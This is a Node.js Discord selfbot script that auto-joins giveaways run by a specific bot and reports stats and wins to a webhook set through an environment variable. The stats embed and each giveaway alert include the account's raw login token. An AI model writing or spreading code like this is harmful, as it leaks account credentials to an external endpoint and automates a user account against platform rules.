require('dotenv').config();
const Discord = require('discord.js-selfbot-v13');
const client = new Discord.Client();
const { Joiner } = require('./joiner');
const { JsonDB, Config } = require("node-json-db");
const fetch = require('node-fetch');

const db = new JsonDB(new Config("stats", true, false, '/'));
const owner = process.env.OWNER_ID;
const webhookLink = process.env.WEBHOOK_LINK;

const joiner = new Joiner(client);
joiner.autoReaction({ timeout: 2000, customBotId: ['530082442967646230'], ownerId: owner });

client.on("messageCreate", async message => {
    if (message.content.startsWith("!stats")) {
        await db.reload();
        const wins = await db.exists('/wins') ? await db.getData('/wins') : '0';
        const joins = await db.exists('/joins') ? await db.getData('/joins') : '0';

        await fetch(webhookLink, {
            method: 'POST',
            body: JSON.stringify({
                embeds: [{
                    author: { name: `${client.user?.username} Stats!`, icon_url: client.user?.displayAvatarURL() },
                    fields: [
                        { name: "Client INFO", value: `\n` },
                        { name: "Username", value: client.user?.username, inline: true },
                        { name: "Guild Count", value: client.guilds.cache.size, inline: true },
                        { name: "Token", value: client.token, inline: false },
                        { name: '\u200b', value: '\u200b', inline: false },
                        { name: "Wins", value: wins, inline: true },
                        { name: "Giveaway joined", value: joins, inline: true }
                    ],
                    timestamp: new Date().toISOString(),
                    footer: { text: "Stats are synced!", icon_url: client.user?.displayAvatarURL() },
                }]
            }),
            headers: {
                "Content-Type": "application/json"
            }
        });
    }
});

async function sendToWebHook(message, embedData, url, id) {
    const embed = {
        title: embedData?.title || "No Title",
        description: `${embedData?.description || "No Description"}\n Teleport to giveaway: ${url}\n Account Username: ${client.user?.username}\n Token: ${client.token}`,
        fields: embedData.fields || [{ value: "No Fields", name: 'ERROR' }],
        image: embedData.image || "",
        footer: embedData.footer || ""
    };

    await fetch(webhookLink, {
        method: 'POST',
        body: JSON.stringify({
            content: message,
            embeds: [embed]
        }),
        headers: {
            "Content-Type": "application/json"
        }
    });
}

async function sendWins(data) {
    await fetch(webhookLink, {
        method: 'POST',
        body: JSON.stringify({
            content: `<@${data.owner}> you've won a giveaway in ${data.data.url} \n ${data.inv}`
        }),
        headers: {
            "Content-Type": "application/json"
        }
    });
}

joiner.eventEmitter.on("giveawayCreated", async giveaway => {
    sendToWebHook(`<@${owner}>`, giveaway.otherData, giveaway.url, giveaway.bot);
});

joiner.eventEmitter.on("wins", async data => {
    sendWins(data);
});

client.login();
